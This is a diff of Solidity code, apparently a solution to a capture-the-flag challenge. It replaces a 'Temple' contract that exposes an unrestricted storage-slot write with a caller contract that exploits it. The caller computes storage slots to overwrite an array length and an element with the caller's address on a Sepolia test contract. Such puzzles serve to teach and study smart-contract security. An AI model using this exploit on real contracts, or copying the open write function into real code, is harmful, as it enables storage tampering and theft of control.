@@ -1,16 +1,42 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.19;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-contract Temple {
-    uint128 public entrance;
-    address public mainHall;
-    mapping(uint8 => mapping(uint8 => address)) public gardens;
-    bytes20[] public chambers;
+// Definisci l'interfaccia del contratto esterno
+interface IExternalContract {
+    function write(uint256 value, bytes32 data) external;
+}
 
-    /// Write data to the contract's ith storage slot
-    function write(uint256 i, bytes32 data) public {
-        assembly {
-            sstore(i, data)
-        }
+contract CallerContract {
+
+    // Indirizzo del contratto esterno su Sepolia
+    address public externalContractAddress = 0xdC4a859fC6c87875a5831B206fD66A4f7D911F6f;
+
+    // Funzione per chiamare la funzione write del contratto esterno
+    function callExternalWrite() public {
+        // Crea un'istanza dell'interfaccia del contratto esterno
+        IExternalContract temple = IExternalContract(externalContractAddress);
+
+        //1
+
+        // Prepara i parametri per la funzione write
+
+        //uint256 value = 1;
+
+        // Chiama la funzione write del contratto esterno
+
+        // temple.write(value, encodedSender);
+
+        //2
+        //uint256 value = 1;
+        //bytes32 encodedSender = bytes32(abi.encode(msg.sender));
+        //uint x = uint(keccak256(abi.encode(20, 2)));
+        //temple.write(uint(keccak256(abi.encode(22, x))),encodedSender);
+
+       //3
+       bytes32 encodedSender = bytes32(abi.encode(msg.sender));
+       temple.write(3, bytes32(uint256(6))); // Updates length
+       temple.write(
+       uint(keccak256(abi.encode(3))) + 5, encodedSender); // Updates chambers[5]
+        
     }
 }
